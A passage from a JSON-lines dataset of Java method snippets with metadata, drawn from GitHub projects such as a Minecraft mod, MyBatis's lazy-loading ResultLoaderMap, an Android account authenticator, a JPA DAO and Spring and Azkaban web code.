"https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedSyringaBlock.java", "stars": "2", "class": {"name": "PottedSyringaBlock", "extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"method_name": "isNormalCube", "params": ["BlockState", "IBlockReader", "BlockPos"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\t\tpublic boolean isNormalCube(BlockState state, IBlockReader worldIn, BlockPos pos) {\t\t\treturn false;\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedSyringaBlock.java", "stars": "2", "class": {"name": "CustomBlock", "extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "propagatesSkylightDown", "params": ["BlockState", "IBlockReader", "BlockPos"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\t\tpublic boolean propagatesSkylightDown(BlockState state, IBlockReader reader, BlockPos pos) {\t\t\treturn true;\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedSyringaBlock.java", "stars": "2", "class": {"name": "CustomBlock", "extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getShape", "params": ["BlockState", "IBlockReader", "BlockPos", "ISelectionContext"], "throws": null, "modifiers": ["public"], "return_type": "VoxelShape", "snippet": "\t\tpublic VoxelShape getShape(BlockState state, IBlockReader world, BlockPos pos, ISelectionContext context) {\t\t\treturn VoxelShapes.create(0.312D, 0D, 0.312D, 0.688D, 0.375D, 0.688D);\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedSyringaBlock.java", "stars": "2", "class": {"name": "CustomBlock", "extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "tickRate", "params": ["IWorldReader"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\t\tpublic int tickRate(IWorldReader world) {\t\t\treturn 0;\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedSyringaBlock.java", "stars": "2", "class": {"name": "CustomBlock", "extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getPickBlock", "params": ["BlockState", "RayTraceResult", "IBlockReader", "BlockPos", "PlayerEntity"], "throws": null, "modifiers": ["public"], "return_type": "ItemStack", "snippet": "\t\tpublic ItemStack getPickBlock(BlockState state, RayTraceResult target, IBlockReader world, BlockPos pos, PlayerEntity player) {\t\t\treturn new ItemStack(SyringaBlock.block, (int) (1));\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedSyringaBlock.java", "stars": "2", "class": {"name": "CustomBlock", "extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getMaterialColor", "params": ["BlockState", "IBlockReader", "BlockPos"], "throws": null, "modifiers": ["public"], "return_type": "MaterialColor", "snippet": "\t\tpublic MaterialColor getMaterialColor(BlockState state, IBlockReader blockAccess, BlockPos pos) {\t\t\treturn MaterialColor.STONE;\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedSyringaBlock.java", "stars": "2", "class": {"name": "CustomBlock", "extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getPushReaction", "params": ["BlockState"], "throws": null, "modifiers": ["public"], "return_type": "PushReaction", "snippet": "\t\tpublic PushReaction getPushReaction(BlockState state) {\t\t\treturn PushReaction.DESTROY;\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedSyringaBlock.java", "stars": "2", "class": {"name": "CustomBlock", "extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getDrops", "params": ["BlockState", "LootContext"], "throws": null, "modifiers": ["public"], "return_type": "List<ItemStack>", "snippet": "\t\tpublic List<ItemStack> getDrops(BlockState state, LootContext.Builder builder) {\t\t\tList<ItemStack> dropsOriginal = super.getDrops(state, builder);\t\t\tif (!dropsOriginal.isEmpty())\t\t\t\treturn dropsOriginal;\t\t\treturn Collections.singletonList(new ItemStack(Blocks.FLOWER_POT, (int) (1)));\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedSyringaBlock.java", "stars": "2", "class": {"name": "CustomBlock", "extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "removedByPlayer", "params": ["BlockState", "World", "BlockPos", "PlayerEntity", "boolean", "IFluidState"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\t\tpublic boolean removedByPlayer(BlockState state, World world, BlockPos pos, PlayerEntity entity, boolean willHarvest, IFluidState fluid) {\t\t\tboolean retval = super.removedByPlayer(state, world, pos, entity, willHarvest, fluid);\t\t\tint x = pos.getX();\t\t\tint y = pos.getY();\t\t\tint z = pos.getZ();\t\t\t{\t\t\t\tjava.util.HashMap<String, Object> $_dependencies = new java.util.HashMap<>();\t\t\t\t$_dependencies.put(\"x\", x);\t\t\t\t$_dependencies.put(\"y\", y);\t\t\t\t$_dependencies.put(\"z\", z);\t\t\t\t$_dependencies.put(\"world\", world);\t\t\t\tSyringaPlayerProcedure.executeProcedure($_dependencies);\t\t\t}\t\t\treturn retval;\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedSyringaBlock.java", "stars": "2", "class": {"name": "CustomBlock", "extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "onExplosionDestroy", "params": ["World", "BlockPos", "Explosion"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void onExplosionDestroy(World world, BlockPos pos, Explosion e) {\t\t\tsuper.onExplosionDestroy(world, pos, e);\t\t\tint x = pos.getX();\t\t\tint y = pos.getY();\t\t\tint z = pos.getZ();\t\t\t{\t\t\t\tjava.util.HashMap<String, Object> $_dependencies = new java.util.HashMap<>();\t\t\t\t$_dependencies.put(\"x\", x);\t\t\t\t$_dependencies.put(\"y\", y);\t\t\t\t$_dependencies.put(\"z\", z);\t\t\t\t$_dependencies.put(\"world\", world);\t\t\t\tSyringaExplosionProcedure.executeProcedure($_dependencies);\t\t\t}\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedSyringaBlock.java", "stars": "2", "class": {"name": "CustomBlock", "extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "onBlockActivated", "params": ["BlockState", "World", "BlockPos", "PlayerEntity", "Hand", "BlockRayTraceResult"], "throws": null, "modifiers": ["public"], "return_type": "ActionResultType", "snippet": "\t\tpublic ActionResultType onBlockActivated(BlockState state, World world, BlockPos pos, PlayerEntity entity, Hand hand,\t\t\t\tBlockRayTraceResult hit) {\t\t\tsuper.onBlockActivated(state, world, pos, entity, hand, hit);\t\t\tint x = pos.getX();\t\t\tint y = pos.getY();\t\t\tint z = pos.getZ();\t\t\tDirection direction = hit.getFace();\t\t\t{\t\t\t\tjava.util.HashMap<String, Object> $_dependencies = new java.util.HashMap<>();\t\t\t\t$_dependencies.put(\"entity\", entity);\t\t\t\t$_dependencies.put(\"x\", x);\t\t\t\t$_dependencies.put(\"y\", y);\t\t\t\t$_dependencies.put(\"z\", z);\t\t\t\t$_dependencies.put(\"world\", world);\t\t\t\tRightClickedSyringaProcedure.executeProcedure($_dependencies);\t\t\t}\t\t\treturn ActionResultType.SUCCESS;\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedSyringaBlock.java", "stars": "2", "class": {"name": "CustomBlock", "extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setAccountAuthenticatorResult", "params": ["Bundle"], "throws": null, "modifiers": ["public", "final"], "return_type": "void", "snippet": "    public final void setAccountAuthenticatorResult(Bundle result) {        mResultBundle = result;    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/AccountAuthenticatorActivity.java", "stars": "74", "class": {"name": "AccountAuthenticatorActivity", "extends": "Activity", "implements": null, "modifiers": ["public"]}}, {"method_name": "onCreate", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        Intent intent = getIntent();        String key = AccountManager.KEY_ACCOUNT_AUTHENTICATOR_RESPONSE;        Parcelable response = intent.getParcelableExtra(key);        if (response != null) {            mAccountAuthenticatorResponse = new AccountAuthenticatorResponse(response);        }        if (mAccountAuthenticatorResponse != null) {            mAccountAuthenticatorResponse.onRequestContinued();        }    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/AccountAuthenticatorActivity.java", "stars": "74", "class": {"name": "AccountAuthenticatorActivity", "extends": "Activity", "implements": null, "modifiers": ["public"]}}, {"method_name": "finish", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void finish() {        if (mAccountAuthenticatorResponse != null) {            // send the result bundle back if set, otherwise send an error.            if (mResultBundle != null) {                mAccountAuthenticatorResponse.onResult(mResultBundle);            } else {                mAccountAuthenticatorResponse.onError(AccountManager.ERROR_CODE_CANCELED,                        \"canceled\");            }            mAccountAuthenticatorResponse = null;        }        super.finish();    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/AccountAuthenticatorActivity.java", "stars": "74", "class": {"name": "AccountAuthenticatorActivity", "extends": "Activity", "implements": null, "modifiers": ["public"]}}, {"method_name": "onRequestContinued", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onRequestContinued() {        mResponse.onRequestContinued();    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/AccountAuthenticatorActivity.java", "stars": "74", "class": {"name": "AccountAuthenticatorResponse", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "onResult", "params": ["Bundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onResult(Bundle result) {        mResponse.onResult(result);    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/AccountAuthenticatorActivity.java", "stars": "74", "class": {"name": "AccountAuthenticatorResponse", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "onError", "params": ["int", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onError(int errorCode, String errorMessage) {        mResponse.onError(errorCode, errorMessage);    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/AccountAuthenticatorActivity.java", "stars": "74", "class": {"name": "AccountAuthenticatorResponse", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "addLoader", "params": ["String", "MetaObject", "ResultLoader"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void addLoader(String property, MetaObject metaResultObject, ResultLoader resultLoader) {    String upperFirst = getUppercaseFirstProperty(property);    if (!upperFirst.equalsIgnoreCase(property) && loaderMap.containsKey(upperFirst)) {      throw new ExecutorException(\"Nested lazy loaded result property '\" + property              + \"' for query id '\" + resultLoader.mappedStatement.getId()              + \" already exists in the result map. The leftmost property of all lazy loaded properties must be unique within a result map.\");    }    loaderMap.put(upperFirst, new LoadPair(property, metaResultObject, resultLoader));  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/loader/ResultLoaderMap.java", "stars": "15", "class": {"name": "ResultLoaderMap", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getProperties", "params": [], "throws": null, "modifiers": ["public", "final"], "return_type": "Map<String,LoadPair>", "snippet": "  public final Map<String, LoadPair> getProperties() {    return new HashMap<>(this.loaderMap);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/loader/ResultLoaderMap.java", "stars": "15", "class": {"name": "ResultLoaderMap", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getPropertyNames", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Set<String>", "snippet": "  public Set<String> getPropertyNames() {    return loaderMap.keySet();  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/loader/ResultLoaderMap.java", "stars": "15", "class": {"name": "ResultLoaderMap", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "size", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int size() {    return loaderMap.size();  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/loader/ResultLoaderMap.java", "stars": "15", "class": {"name": "ResultLoaderMap", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "hasLoader", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean hasLoader(String property) {    return loaderMap.containsKey(property.toUpperCase(Locale.ENGLISH));  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/loader/ResultLoaderMap.java", "stars": "15", "class": {"name": "ResultLoaderMap", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "load", "params": ["String"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean load(String property) throws SQLException {    LoadPair pair = loaderMap.remove(property.toUpperCase(Locale.ENGLISH));    if (pair != null) {      pair.load();      return true;    }    return false;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/loader/ResultLoaderMap.java", "stars": "15", "class": {"name": "ResultLoaderMap", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "remove", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void remove(String property) {    loaderMap.remove(property.toUpperCase(Locale.ENGLISH));  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/loader/ResultLoaderMap.java", "stars": "15", "class": {"name": "ResultLoaderMap", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "loadAll", "params": [], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void loadAll() throws SQLException {    final Set<String> methodNameSet = loaderMap.keySet();    String[] methodNames = methodNameSet.toArray(new String[methodNameSet.size()]);    for (String methodName : methodNames) {      load(methodName);    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/loader/ResultLoaderMap.java", "stars": "15", "class": {"name": "ResultLoaderMap", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getUppercaseFirstProperty", "params": ["String"], "throws": null, "modifiers": ["private", "static"], "return_type": "String", "snippet": "  private static String getUppercaseFirstProperty(String property) {    String[] parts = property.split(\"\\\\.\");    return parts[0].toUpperCase(Locale.ENGLISH);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/loader/ResultLoaderMap.java", "stars": "15", "class": {"name": "ResultLoaderMap", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "load", "params": [], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void load() throws SQLException {      /* These field should not be null unless the loadpair was serialized.       * Yet in that case this method should not be called. */      if (this.metaResultObject == null) {        throw new IllegalArgumentException(\"metaResultObject is null\");      }      if (this.resultLoader == null) {        throw new IllegalArgumentException(\"resultLoader is null\");      }      this.load(null);    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/loader/ResultLoaderMap.java", "stars": "15", "class": {"name": "LoadPair", "extends": null, "implements": ["Serializable"], "modifiers": ["public", "static"]}}, {"method_name": "load", "params": ["Object"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void load(final Object userObject) throws SQLException {      if (this.metaResultObject == null || this.resultLoader == null) {        if (this.mappedParameter == null) {          throw new ExecutorException(\"Property [\" + this.property + \"] cannot be loaded because \"                  + \"required parameter of mapped statement [\"                  + this.mappedStatement + \"] is not serializable.\");        }        final Configuration config = this.getConfiguration();        final MappedStatement ms = config.getMappedStatement(this.mappedStatement);        if (ms == null) {          throw new ExecutorException(\"Cannot lazy load property [\" + this.property                  + \"] of deserialized object [\" + userObject.getClass()                  + \"] because configuration does not contain statement [\"                  + this.mappedStatement + \"]\");        }        this.metaResultObject = config.newMetaObject(userObject);        this.resultLoader = new ResultLoader(config, new ClosedExecutor(), ms, this.mappedParameter,                metaResultObject.getSetterType(this.property), null, null);      }      /* We are using a new executor because we may be (and likely are) on a new thread       * and executors aren't thread safe. (Is this sufficient?)       *       * A better approach would be making executors thread safe. */      if (this.serializationCheck == null) {        final ResultLoader old = this.resultLoader;        this.resultLoader = new ResultLoader(old.configuration, new ClosedExecutor(), old.mappedStatement,                old.parameterObject, old.targetType, old.cacheKey, old.boundSql);      }      this.metaResultObject.setValue(property, this.resultLoader.loadResult());    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/loader/ResultLoaderMap.java", "stars": "15", "class": {"name": "LoadPair", "extends": null, "implements": ["Serializable"], "modifiers": ["public", "static"]}}, {"method_name": "getConfiguration", "params": [], "throws": null, "modifiers": ["private"], "return_type": "Configuration", "snippet": "    private Configuration getConfiguration() {      if (this.configurationFactory == null) {        throw new ExecutorException(\"Cannot get Configuration as configuration factory was not set.\");      }      Object configurationObject;      try {        final Method factoryMethod = this.configurationFactory.getDeclaredMethod(FACTORY_METHOD);        if (!Modifier.isStatic(factoryMethod.getModifiers())) {          throw new ExecutorException(\"Cannot get Configuration as factory method [\"                  + this.configurationFactory + \"]#[\"                  + FACTORY_METHOD + \"] is not static.\");        }        if (!factoryMethod.isAccessible()) {          configurationObject = AccessController.doPrivileged((PrivilegedExceptionAction<Object>) () -> {            try {              factoryMethod.setAccessible(true);              return factoryMethod.invoke(null);            } finally {              factoryMethod.setAccessible(false);            }          });        } else {          configurationObject = factoryMethod.invoke(null);        }      } catch (final ExecutorException ex) {        throw ex;      } catch (final NoSuchMethodException ex) {        throw new ExecutorException(\"Cannot get Configuration as factory class [\"                + this.configurationFactory + \"] is missing factory method of name [\"                + FACTORY_METHOD + \"].\", ex);      } catch (final PrivilegedActionException ex) {        throw new ExecutorException(\"Cannot get Configuration as factory method [\"                + this.configurationFactory + \"]#[\"                + FACTORY_METHOD + \"] threw an exception.\", ex.getCause());      } catch (final Exception ex) {        throw new ExecutorException(\"Cannot get Configuration as factory method [\"                + this.configurationFactory + \"]#[\"                + FACTORY_METHOD + \"] threw an exception.\", ex);      }      if (!(configurationObject instanceof Configuration)) {        throw new ExecutorException(\"Cannot get Configuration as factory method [\"                + this.configurationFactory + \"]#[\"                + FACTORY_METHOD + \"] didn't return [\" + Configuration.class + \"] but [\"                + (configurationObject == null ? \"null\" : configurationObject.getClass()) + \"].\");      }      return Configuration.class.cast(configurationObject);    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/loader/ResultLoaderMap.java", "stars": "15", "class": {"name": "LoadPair", "extends": null, "implements": ["Serializable"], "modifiers": ["public", "static"]}}, {"method_name": "getLogger", "params": [], "throws": null, "modifiers": ["private"], "return_type": "Log", "snippet": "    private Log getLogger() {      if (this.log == null) {        this.log = LogFactory.getLog(this.getClass());      }      return this.log;    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/loader/ResultLoaderMap.java", "stars": "15", "class": {"name": "LoadPair", "extends": null, "implements": ["Serializable"], "modifiers": ["public", "static"]}}, {"method_name": "isClosed", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isClosed() {      return true;    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/loader/ResultLoaderMap.java", "stars": "15", "class": {"name": "ClosedExecutor", "extends": "BaseExecutor", "implements": null, "modifiers": ["private", "static", "final"]}}, {"method_name": "doUpdate", "params": ["MappedStatement", "Object"], "throws": ["SQLException"], "modifiers": ["protected"], "return_type": "int", "snippet": "    protected int doUpdate(MappedStatement ms, Object parameter) throws SQLException {      throw new UnsupportedOperationException(\"Not supported.\");    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/loader/ResultLoaderMap.java", "stars": "15", "class": {"name": "ClosedExecutor", "extends": "BaseExecutor", "implements": null, "modifiers": ["private", "static", "final"]}}, {"method_name": "doFlushStatements", "params": ["boolean"], "throws": ["SQLException"], "modifiers": ["protected"], "return_type": "List<BatchResult>", "snippet": "    protected List<BatchResult> doFlushStatements(boolean isRollback) throws SQLException {      throw new UnsupportedOperationException(\"Not supported.\");    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/loader/ResultLoaderMap.java", "stars": "15", "class": {"name": "ClosedExecutor", "extends": "BaseExecutor", "implements": null, "modifiers": ["private", "static", "final"]}}, {"method_name": "doQuery", "params": ["MappedStatement", "Object", "RowBounds", "ResultHandler", "BoundSql"], "throws": ["SQLException"], "modifiers": ["protected"], "return_type": "List<E>", "snippet": "    protected <E> List<E> doQuery(MappedStatement ms, Object parameter, RowBounds rowBounds, ResultHandler resultHandler, BoundSql boundSql) throws SQLException {      throw new UnsupportedOperationException(\"Not supported.\");    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/loader/ResultLoaderMap.java", "stars": "15", "class": {"name": "ClosedExecutor", "extends": "BaseExecutor", "implements": null, "modifiers": ["private", "static", "final"]}}, {"method_name": "doQueryCursor", "params": ["MappedStatement", "Object", "RowBounds", "BoundSql"], "throws": ["SQLException"], "modifiers": ["protected"], "return_type": "Cursor<E>", "snippet": "    protected <E> Cursor<E> doQueryCursor(MappedStatement ms, Object parameter, RowBounds rowBounds, BoundSql boundSql) throws SQLException {      throw new UnsupportedOperationException(\"Not supported.\");    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/loader/ResultLoaderMap.java", "stars": "15", "class": {"name": "ClosedExecutor", "extends": "BaseExecutor", "implements": null, "modifiers": ["private", "static", "final"]}}, {"method_name": "salvar", "params": ["Pedido"], "throws": null, "modifiers": ["public"], "return_type": "Pedido", "snippet": "public Pedido salvar(Pedido pedido) {\tEntityManager em = JPAUtil.getEntityManager();\tEntityTransaction trx = em.getTransaction();\ttrx.begin();\tpedido = em.merge(pedido);\ttrx.commit();\tem.close();\treturn pedido;}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/dao/PedidoDao.java", "stars": "1", "class": {"name": "PedidoDao", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "buscarTodos", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Pedido>", "snippet": "public List<Pedido> buscarTodos() {\tEntityManager em = JPAUtil.getEntityManager();\tTypedQuery<Pedido> query = em.createQuery(\"from Pedido\", Pedido.class);\ttry {\t\treturn query.getResultList();\t} finally {\t\tem.close();\t}}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/dao/PedidoDao.java", "stars": "1", "class": {"name": "PedidoDao", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onAccuracyChanged", "params": ["android", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onAccuracyChanged (android.hardware.Sensor p0, int p1)\t{\t\tn_onAccuracyChanged (p0, p1);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/crc64a0e0a82d0db9a07d/SensorListener.java", "stars": "2", "class": {"name": "SensorListener", "extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "n_onAccuracyChanged", "params": ["android", "int"], "throws": null, "modifiers": ["native", "private"], "return_type": "void", "snippet": "\tprivate native void n_onAccuracyChanged (android.hardware.Sensor p0, int p1);\tpublic void onSensorChanged (android.hardware.SensorEvent p0)\t{\t\tn_onSensorChanged (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/crc64a0e0a82d0db9a07d/SensorListener.java", "stars": "2", "class": {"name": "SensorListener", "extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "onSensorChanged", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onSensorChanged (android.hardware.SensorEvent p0)\t{\t\tn_onSensorChanged (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/crc64a0e0a82d0db9a07d/SensorListener.java", "stars": "2", "class": {"name": "SensorListener", "extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "n_onSensorChanged", "params": ["android"], "throws": null, "modifiers": ["native", "private"], "return_type": "void", "snippet": "\tprivate native void n_onSensorChanged (android.hardware.SensorEvent p0);\tprivate java.util.ArrayList refList;\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/crc64a0e0a82d0db9a07d/SensorListener.java", "stars": "2", "class": {"name": "SensorListener", "extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "monodroidAddReference", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/crc64a0e0a82d0db9a07d/SensorListener.java", "stars": "2", "class": {"name": "SensorListener", "extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "monodroidClearReferences", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\t{\t\tif (refList != null)\t\t\trefList.clear ();\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/crc64a0e0a82d0db9a07d/SensorListener.java", "stars": "2", "class": {"name": "SensorListener", "extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "configureMessageConverters", "params": ["List<HttpMessageConverter>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void configureMessageConverters(List<HttpMessageConverter<?>> converters) {        converters.add(0, new MappingJackson2HttpMessageConverter());    }", "url": "https://raw.githubusercontent.com/jiangvin/webtank/master/websocket/src/main/java/com/integration/socket/configuration/WebMvcConfiguration.java", "stars": "2", "class": {"name": "WebMvcConfiguration", "extends": null, "implements": ["WebMvcConfigurer"], "modifiers": ["public"]}}, {"method_name": "configureContentNegotiation", "params": ["ContentNegotiationConfigurer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void configureContentNegotiation(ContentNegotiationConfigurer configurer) {        configurer.defaultContentType(MediaType.APPLICATION_JSON);    }", "url": "https://raw.githubusercontent.com/jiangvin/webtank/master/websocket/src/main/java/com/integration/socket/configuration/WebMvcConfiguration.java", "stars": "2", "class": {"name": "WebMvcConfiguration", "extends": null, "implements": ["WebMvcConfigurer"], "modifiers": ["public"]}}, {"method_name": "init", "params": ["ServletConfig"], "throws": ["ServletException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void init(final ServletConfig config) throws ServletException {    super.init(config);    final AzkabanWebServer server = (AzkabanWebServer) getApplication();    this.execManagerAdapter = server.getExecutorManager();  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/StatsServlet.java", "stars": "18", "class": {"name": "StatsServlet", "extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"method_name": "handleGet", "params": ["HttpServletRequest", "HttpServletResponse", "Session"], "throws": ["ServletException", "IOException"], "modifiers": ["protected"], "return_type": "void", "snippet": "  protected void handleGet(final HttpServletRequest req, final HttpServletResponse resp,      final Session session)      throws ServletException,      IOException {    if (hasParam(req, ConnectorParams.ACTION_PARAM)) {      handleAJAXAction(req, resp, session);    } else {      handleStatePageLoad(req, resp, session);    }  }", "url": 